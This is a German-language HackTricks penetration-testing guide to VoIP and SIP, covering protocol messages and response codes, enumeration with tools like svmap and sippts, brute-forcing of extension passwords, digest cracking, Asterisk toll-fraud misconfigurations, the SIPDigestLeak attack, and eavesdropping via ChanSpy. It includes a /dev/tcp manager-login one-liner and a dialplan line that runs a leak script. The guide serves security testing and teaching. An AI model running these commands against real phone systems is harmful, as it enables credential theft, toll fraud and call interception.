# Pentesting VoIP

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## VoIP Grundinformationen

Um zu lernen, wie VoIP funktioniert, √ºberpr√ºfen Sie:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Grundlegende Nachrichten
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xx‚ÄîVorl√§ufige Antworten**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîErfolgreiche Antworten**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîUmleitungsantworten**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîClient-Fehlerantworten**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîServerfehlerantworten**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîGlobale Fehlerantworten**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telefonnummern

Einer der ersten Schritte, die ein Red Team unternehmen k√∂nnte, ist die Suche nach verf√ºgbaren Telefonnummern, um mit dem Unternehmen √ºber OSINT-Tools, Google-Suchen oder das Scraping von Webseiten Kontakt aufzunehmen.

Sobald Sie die Telefonnummern haben, k√∂nnten Sie Online-Dienste nutzen, um den Anbieter zu identifizieren:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Wenn Sie wissen, ob der Anbieter VoIP-Dienste anbietet, k√∂nnten Sie feststellen, ob das Unternehmen VoIP verwendet... Dar√ºber hinaus ist es m√∂glich, dass das Unternehmen keine VoIP-Dienste in Anspruch genommen hat, sondern PSTN-Karten verwendet, um seine eigene VoIP-PBX mit dem traditionellen Telefonnetz zu verbinden.

Dinge wie automatisierte Musikantworten deuten normalerweise darauf hin, dass VoIP verwendet wird.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT-Informationen

Jede andere OSINT-Erhebung, die hilft, die verwendete VoIP-Software zu identifizieren, wird f√ºr ein Red Team hilfreich sein.

### Netzwerkerhebung

* **`nmap`** ist in der Lage, UDP-Dienste zu scannen, aber aufgrund der Anzahl der gescannten UDP-Dienste ist es sehr langsam und m√∂glicherweise nicht sehr genau bei dieser Art von Diensten.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** von SIPVicious (`sudo apt install sipvicious`): Wird SIP-Dienste im angegebenen Netzwerk lokalisieren.
* `svmap` ist **einfach zu blockieren**, da es den User-Agent `friendly-scanner` verwendet, aber Sie k√∂nnten den Code von `/usr/share/sipvicious/sipvicious` modifizieren und ihn √§ndern.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS scan ist ein sehr schneller Scanner f√ºr SIP-Dienste √ºber UDP, TCP oder TLS. Es verwendet Multithreading und kann gro√üe Netzwerkbereiche scannen. Es erm√∂glicht, einen Portbereich einfach anzugeben, sowohl TCP als auch UDP zu scannen, eine andere Methode zu verwenden (standardm√§√üig wird OPTIONS verwendet) und einen anderen User-Agent anzugeben (und mehr).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Zus√§tzliche Netzwerkenumeration

Die PBX k√∂nnte auch andere Netzwerkdienste wie folgt bereitstellen:

* **69/UDP (TFTP)**: Firmware-Updates
* **80 (HTTP) / 443 (HTTPS)**: Um das Ger√§t √ºber das Web zu verwalten
* **389 (LDAP)**: Alternative zur Speicherung der Benutzerinformationen
* **3306 (MySQL)**: MySQL-Datenbank
* **5038 (Manager)**: Erm√∂glicht die Nutzung von Asterisk von anderen Plattformen
* **5222 (XMPP)**: Nachrichten √ºber Jabber
* **5432 (PostgreSQL)**: PostgreSQL-Datenbank
* Und andere...

### Methoden-Enumeration

Es ist m√∂glich, **welche Methoden verf√ºgbar sind** zur Nutzung in der PBX mit `SIPPTS enumerate` von [**sippts**](https://github.com/Pepelux/sippts) zu finden.
```bash
sippts enumerate -i 10.10.0.10
```
### Analysieren von Serverantworten

Es ist sehr wichtig, die Header zu analysieren, die ein Server uns zur√ºcksendet, abh√§ngig von der Art der Nachricht und der Header, die wir senden. Mit `SIPPTS send` von [**sippts**](https://github.com/Pepelux/sippts) k√∂nnen wir personalisierte Nachrichten senden, alle Header manipulieren und die Antwort analysieren.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Es ist auch m√∂glich, Daten zu erhalten, wenn der Server Websockets verwendet. Mit `SIPPTS wssend` von [**sippts**](https://github.com/Pepelux/sippts) k√∂nnen wir personalisierte WS-Nachrichten senden.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Erweiterung Enumeration

Erweiterungen in einem PBX (Private Branch Exchange) System beziehen sich auf die **einzigartigen internen Identifikatoren, die einzelnen** Telefonleitungen, Ger√§ten oder Benutzern innerhalb einer Organisation oder eines Unternehmens zugewiesen sind. Erweiterungen erm√∂glichen es, **Anrufe innerhalb der Organisation effizient zu leiten**, ohne dass f√ºr jeden Benutzer oder jedes Ger√§t individuelle externe Telefonnummern erforderlich sind.

* **`svwar`** von SIPVicious (`sudo apt install sipvicious`): `svwar` ist ein kostenloser SIP PBX Erweiterungslinien-Scanner. Im Konzept funktioniert es √§hnlich wie traditionelle Wardialer, indem es **eine Reihe von Erweiterungen oder eine gegebene Liste von Erweiterungen err√§t**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifiziert Erweiterungen auf einem SIP-Server. Sipexten kann gro√üe Netzwerk- und Portbereiche √ºberpr√ºfen.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Sie k√∂nnen auch Erweiterungen/Benutzernamen mit metasploit auflisten:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** ist ein Inter Asterisk Exchange-Protokoll **Benutzername-Brute-Force-Enumerator**. enumIAX kann in zwei verschiedenen Modi arbeiten: sequentielles Benutzernamen-Raten oder W√∂rterbuchangriff.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP-Angriffe

### Passwort-Brute-Force - online

Nachdem das **PBX** und einige **Erweiterungen/Benutzernamen** entdeckt wurden, k√∂nnte ein Red Team versuchen, sich √ºber die `REGISTER`-Methode bei einer Erweiterung zu authentifizieren, indem es ein W√∂rterbuch mit g√§ngigen Passw√∂rtern verwendet, um die Authentifizierung zu brute-forcen.

{% hint style="danger" %}
Beachten Sie, dass ein **Benutzername** derselbe wie die Erweiterung sein kann, aber diese Praxis je nach PBX-System, dessen Konfiguration und den Vorlieben der Organisation variieren kann...

Wenn der Benutzername nicht derselbe wie die Erweiterung ist, m√ºssen Sie **den Benutzernamen herausfinden, um ihn zu brute-forcen**.
{% endhint %}

* **`svcrack`** von SIPVicious (`sudo apt install sipvicious`): SVCrack erm√∂glicht es Ihnen, das Passwort f√ºr einen bestimmten Benutzernamen/eine bestimmte Erweiterung auf einem PBX zu knacken.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack ist ein Remote-Passwort-Cracker f√ºr SIP-Dienste. Rcrack kann Passw√∂rter f√ºr mehrere Benutzer in verschiedenen IPs und Portbereichen testen.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

Wenn Sie VoIP-Ger√§te in einem **Open Wifi-Netzwerk** finden, k√∂nnten Sie **alle Informationen sniffen**. Dar√ºber hinaus, wenn Sie sich in einem geschlosseneren Netzwerk (verbunden √ºber Ethernet oder gesch√ºtztes Wifi) befinden, k√∂nnten Sie **MitM-Angriffe wie** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) zwischen der **PBX und dem Gateway** durchf√ºhren, um die Informationen zu sniffen.

Unter den Netzwerkinformationen k√∂nnten Sie **Web-Anmeldeinformationen** finden, um die Ger√§te zu verwalten, Benutzer-**Durchwahlen**, **Benutzernamen**, **IP**-Adressen, sogar **gehashte Passw√∂rter** und **RTP-Pakete**, die Sie reproduzieren k√∂nnten, um **das Gespr√§ch zu h√∂ren**, und mehr.

Um diese Informationen zu erhalten, k√∂nnten Sie Tools wie Wireshark, tcpdump... verwenden, aber ein **speziell entwickeltes Tool zum Sniffen von VoIP-Gespr√§chen ist** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Beachten Sie, dass wenn **TLS in der SIP-Kommunikation verwendet wird**, Sie die SIP-Kommunikation nicht im Klartext sehen k√∂nnen.\
Das gleiche wird passieren, wenn **SRTP** und **ZRTP** verwendet werden, **RTP-Pakete werden nicht im Klartext sein**.
{% endhint %}

#### SIP-Anmeldeinformationen (Passwort-Brute-Force - offline)

[√úberpr√ºfen Sie dieses Beispiel, um eine **SIP REGISTER-Kommunikation** besser zu verstehen](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example), um zu lernen, wie **Anmeldeinformationen gesendet werden**.

* **`sipdump`** & **`sipcrack`,** Teil von **sipcrack** (`apt-get install sipcrack`): Diese Tools k√∂nnen **aus einer **pcap** die **Digest-Authentifizierungen** innerhalb des SIP-Protokolls extrahieren und **bruteforcen**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump kann Digest-Authentifizierungen aus einer pcap-Datei extrahieren.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack ist ein Tool zum Knacken der mit SIPPTS dump erhaltenen Digest-Authentifizierungen.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrahiert Daten des SIP-Protokolls aus einer PCAP-Datei.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF-Codes

**Nicht nur SIP-Anmeldeinformationen** k√∂nnen im Netzwerkverkehr gefunden werden, es ist auch m√∂glich, DTMF-Codes zu finden, die beispielsweise verwendet werden, um auf die **Voicemail** zuzugreifen.\
Es ist m√∂glich, diese Codes in **INFO SIP-Nachrichten**, in **Audio** oder innerhalb von **RTP-Paketen** zu senden. Wenn die Codes in RTP-Paketen enthalten sind, k√∂nnten Sie diesen Teil des Gespr√§chs ausschneiden und das Tool multimo verwenden, um sie zu extrahieren:
```bash
multimon -a DTMF -t wac pin.wav
```
### Kostenlose Anrufe / Asterisk-Verbindungsfehlkonfigurationen

In Asterisk ist es m√∂glich, eine Verbindung **von einer bestimmten IP-Adresse** oder von **irgendeiner IP-Adresse** zuzulassen:
```
host=10.10.10.10
host=dynamic
```
Wenn eine IP-Adresse angegeben ist, muss der Host **keine REGISTER**-Anfragen von Zeit zu Zeit senden (im REGISTER-Paket wird die Lebensdauer gesendet, normalerweise 30 Minuten, was bedeutet, dass das Telefon in einem anderen Szenario alle 30 Minuten REGISTRIEREN muss). Es m√ºssen jedoch offene Ports vorhanden sein, die Verbindungen vom VoIP-Server zu Anrufen zulassen.

Um Benutzer zu definieren, k√∂nnen sie wie folgt definiert werden:

* **`type=user`**: Der Benutzer kann nur Anrufe als Benutzer empfangen.
* **`type=friend`**: Es ist m√∂glich, Anrufe als Peer zu t√§tigen und sie als Benutzer zu empfangen (wird mit Erweiterungen verwendet).
* **`type=peer`**: Es ist m√∂glich, Anrufe als Peer zu senden und zu empfangen (SIP-Trunks).

Es ist auch m√∂glich, Vertrauen mit der unsicheren Variable herzustellen:

* **`insecure=port`**: Erlaubt Peer-Verbindungen, die durch IP validiert werden.
* **`insecure=invite`**: Erfordert keine Authentifizierung f√ºr INVITE-Nachrichten.
* **`insecure=port,invite`**: Beides.

{% hint style="warning" %}
Wenn **`type=friend`** verwendet wird, wird der **Wert** der **Host**-Variablen **nicht verwendet**, sodass ein Administrator, der einen SIP-Trunk mit diesem Wert **falsch konfiguriert**, **von jedem verbunden werden kann**.

Zum Beispiel w√§re diese Konfiguration anf√§llig:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Kostenlose Anrufe / Asterisk-Kontextfehlkonfigurationen

In Asterisk ist ein **Kontext** ein benannter Container oder Abschnitt im W√§hlplan, der **verwandte Erweiterungen, Aktionen und Regeln gruppiert**. Der W√§hlplan ist das Kernkomponente eines Asterisk-Systems, da er definiert, **wie eingehende und ausgehende Anrufe behandelt und weitergeleitet werden**. Kontexte werden verwendet, um den W√§hlplan zu organisieren, den Zugriff zu steuern und eine Trennung zwischen verschiedenen Teilen des Systems bereitzustellen.

Jeder Kontext wird in der Konfigurationsdatei definiert, typischerweise in der **`extensions.conf`**-Datei. Kontexte werden durch eckige Klammern angezeigt, wobei der Kontextname darin eingeschlossen ist. Zum Beispiel:
```bash
csharpCopy code[my_context]
```
Innerhalb des Kontexts definieren Sie Erweiterungen (Muster gew√§hlter Nummern) und verkn√ºpfen sie mit einer Reihe von Aktionen oder Anwendungen. Diese Aktionen bestimmen, wie der Anruf verarbeitet wird. Zum Beispiel:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Dieses Beispiel demonstriert einen einfachen Kontext namens "my\_context" mit einer Erweiterung "100". Wenn jemand 100 w√§hlt, wird der Anruf entgegengenommen, eine Willkommensnachricht abgespielt und dann wird der Anruf beendet.

Dies ist **ein weiterer Kontext**, der es erm√∂glicht, **eine andere Nummer anzurufen**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Wenn der Administrator den **Standardkontext** definiert als:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Jeder wird in der Lage sein, den **Server zu nutzen, um zu einer beliebigen anderen Nummer zu telefonieren** (und der Administrator des Servers wird f√ºr den Anruf bezahlen).
{% endhint %}

{% hint style="danger" %}
Dar√ºber hinaus enth√§lt die **`sip.conf`**-Datei standardm√§√üig **`allowguest=true`**, sodass **jeder** Angreifer ohne **Authentifizierung** zu einer beliebigen anderen Nummer anrufen kann.
{% endhint %}

*   **`SIPPTS invite`** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite √ºberpr√ºft, ob ein **PBX-Server es uns erlaubt, Anrufe ohne Authentifizierung zu t√§tigen**. Wenn der SIP-Server eine falsche Konfiguration hat, erlaubt er uns, Anrufe zu externen Nummern zu t√§tigen. Es kann uns auch erlauben, den Anruf an eine zweite externe Nummer weiterzuleiten.

Zum Beispiel, wenn Ihr Asterisk-Server eine schlechte Kontextkonfiguration hat, k√∂nnen Sie INVITE-Anfragen ohne Autorisierung akzeptieren. In diesem Fall kann ein Angreifer Anrufe t√§tigen, ohne Benutzername/Passwort zu kennen.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Kostenlose Anrufe / Fehlkonfigurierte IVRS

IVRS steht f√ºr **Interactive Voice Response System**, eine Telefontechnologie, die es Benutzern erm√∂glicht, √ºber Sprach- oder Tastenanschl√§ge mit einem computerisierten System zu interagieren. IVRS wird verwendet, um **automatisierte Anrufbearbeitung**ssysteme zu erstellen, die eine Reihe von Funktionen bieten, wie z.B. Informationen bereitzustellen, Anrufe weiterzuleiten und Benutzereingaben zu erfassen.

IVRS in VoIP-Systemen besteht typischerweise aus:

1. **Sprachansagen**: Vorgefertigte Audio-Nachrichten, die Benutzer durch die IVR-Men√ºoptionen und Anweisungen f√ºhren.
2. **DTMF** (Dual-Tone Multi-Frequency) Signalisierung: Tastenanschl√§ge, die durch Dr√ºcken von Tasten am Telefon erzeugt werden und zur Navigation durch die IVR-Men√ºs und zur Eingabe verwendet werden.
3. **Anrufweiterleitung**: Weiterleitung von Anrufen an das entsprechende Ziel, wie z.B. spezifische Abteilungen, Agenten oder Durchwahlen basierend auf Benutzereingaben.
4. **Erfassung von Benutzereingaben**: Sammlung von Informationen von Anrufern, wie z.B. Kontonummern, Fall-IDs oder andere relevante Daten.
5. **Integration mit externen Systemen**: Verbindung des IVR-Systems mit Datenbanken oder anderen Software-Systemen, um Informationen abzurufen oder zu aktualisieren, Aktionen auszuf√ºhren oder Ereignisse auszul√∂sen.

In einem Asterisk VoIP-System k√∂nnen Sie ein IVR mithilfe des W√§hlplans (**`extensions.conf`** Datei) und verschiedener Anwendungen wie `Background()`, `Playback()`, `Read()` und mehr erstellen. Diese Anwendungen helfen Ihnen, Sprachansagen abzuspielen, Benutzereingaben zu erfassen und den Anrufverlauf zu steuern.

#### Beispiel f√ºr eine anf√§llige Konfiguration
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Der vorherige ist ein Beispiel, bei dem der Benutzer aufgefordert wird, **1 zu dr√ºcken, um** eine Abteilung anzurufen, **2 zu dr√ºcken, um** eine andere anzurufen, oder **die vollst√§ndige Durchwahl**, wenn er sie kennt.\
Die Schwachstelle besteht darin, dass die angegebene **Durchwahl-L√§nge nicht √ºberpr√ºft wird, sodass ein Benutzer die 5-Sekunden-Zeit√ºberschreitung einer vollst√§ndigen Nummer eingeben kann und diese angerufen wird.**

### Extension Injection

Verwendung einer Durchwahl wie:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Wo **`${EXTEN}`** die **Durchwahl** ist, die angerufen wird, wenn die **Durchwahl 101 eingef√ºhrt wird**, w√ºrde Folgendes passieren:
```scss
exten => 101,1,Dial(SIP/101)
```
Allerdings, wenn **`${EXTEN}`** die Einf√ºhrung von **mehr als nur Zahlen** erlaubt (wie in √§lteren Asterisk-Versionen), k√∂nnte ein Angreifer **`101&SIP123123123`** eingeben, um die Telefonnummer 123123123 anzurufen. Und das w√§re das Ergebnis:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Daher wird ein Anruf an die Nebenstelle **`101`** und **`123123123`** gesendet, und nur der erste, der den Anruf erh√§lt, wird hergestellt... aber wenn ein Angreifer eine **Nebenstelle verwendet, die jede √úbereinstimmung umgeht**, die durchgef√ºhrt wird, aber nicht existiert, k√∂nnte er **einen Anruf nur an die gew√ºnschte Nummer injizieren**.

## SIPDigestLeak-Schwachstelle

Die SIP Digest Leak ist eine Schwachstelle, die eine gro√üe Anzahl von SIP-Telefonen betrifft, einschlie√ülich sowohl Hardware- als auch Software-IP-Telefone sowie Telefonadapter (VoIP zu analog). Die Schwachstelle erm√∂glicht **das Leck der Digest-Authentifizierungsantwort**, die aus dem Passwort berechnet wird. Ein **Offline-Passwortangriff ist dann m√∂glich** und kann die meisten Passw√∂rter basierend auf der Challenge-Antwort wiederherstellen.

**[Schwachstellenszenario von hier**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Ein IP-Telefon (Opfer) h√∂rt auf einem beliebigen Port (zum Beispiel: 5060) und akzeptiert Anrufe
2. Der Angreifer sendet eine INVITE an das IP-Telefon
3. Das Opfertelefon beginnt zu klingeln und jemand hebt ab und legt auf (weil niemand den Anruf am anderen Ende beantwortet)
4. Wenn das Telefon aufgelegt wird, sendet das **Opfertelefon ein BYE an den Angreifer**
5. Der **Angreifer gibt eine 407-Antwort aus**, die **nach Authentifizierung fragt** und eine Authentifizierungsherausforderung ausgibt
6. Das **Opfertelefon gibt eine Antwort auf die Authentifizierungsherausforderung** in einem zweiten BYE
7. Der **Angreifer kann dann einen Brute-Force-Angriff** auf die Challenge-Antwort auf seinem lokalen Rechner (oder verteilten Netzwerk usw.) durchf√ºhren und das Passwort erraten

* **SIPPTS-Leck** von [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS-Leck nutzt die SIP Digest Leak-Schwachstelle aus, die eine gro√üe Anzahl von SIP-Telefonen betrifft. Die Ausgabe kann im SipCrack-Format gespeichert werden, um sie mit SIPPTS dcrack oder dem SipCrack-Tool zu bruteforcen.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call erm√∂glicht es einem **Webbenutzer** (der beispielsweise an einem Produkt interessiert sein k√∂nnte), seine **Telefonnummer** anzugeben, um einen Anruf zu erhalten. Dann wird ein kommerzieller Anruf get√§tigt, und wenn er **den H√∂rer abnimmt**, wird der Benutzer **angeklingelt und mit dem Agenten verbunden**.

Ein g√§ngiges Asterisk-Profil daf√ºr ist:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Das vorherige Profil erlaubt **JEDER IP-Adresse die Verbindung** (wenn das Passwort bekannt ist).
* Um **einen Anruf zu organisieren**, wie zuvor angegeben, sind **keine Leseberechtigungen erforderlich** und **nur** **originate** in **Schreib** ist n√∂tig.

Mit diesen Berechtigungen k√∂nnte jede IP, die das Passwort kennt, sich verbinden und zu viele Informationen extrahieren, wie:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Weitere Informationen oder Aktionen k√∂nnten angefordert werden.**

### **Abh√∂ren**

In Asterisk ist es m√∂glich, den Befehl **`ChanSpy`** zu verwenden, um die **Erweiterung(en), die √ºberwacht werden sollen** (oder alle) anzugeben, um Gespr√§che zu h√∂ren, die stattfinden. Dieser Befehl muss einer Erweiterung zugewiesen werden.

Zum Beispiel, **`exten => 333,1,ChanSpy('all',qb)`** bedeutet, dass wenn Sie die **Erweiterung 333 anrufen**, es **alle** Erweiterungen **√ºberwachen** wird, **beginnt zuzuh√∂ren**, wann immer ein neues Gespr√§ch beginnt (**`b`**) im ruhigen Modus (**`q`**), da wir nicht interagieren m√∂chten. Sie k√∂nnen von einem laufenden Gespr√§ch zum anderen wechseln, indem Sie **`*`** dr√ºcken oder die Erweiterungsnummer w√§hlen.

Es ist auch m√∂glich, **`ExtenSpy`** zu verwenden, um nur eine Erweiterung zu √ºberwachen.

Anstatt die Gespr√§che anzuh√∂ren, ist es m√∂glich, sie in Dateien **aufzuzeichnen** mit einer Erweiterung wie: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Anrufe werden in **`/tmp`** gespeichert.

Sie k√∂nnten Asterisk sogar dazu bringen, ein Skript auszuf√ºhren, das den Anruf **leakt**, wenn er beendet wird.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed-Sicherheitsanf√§lligkeit

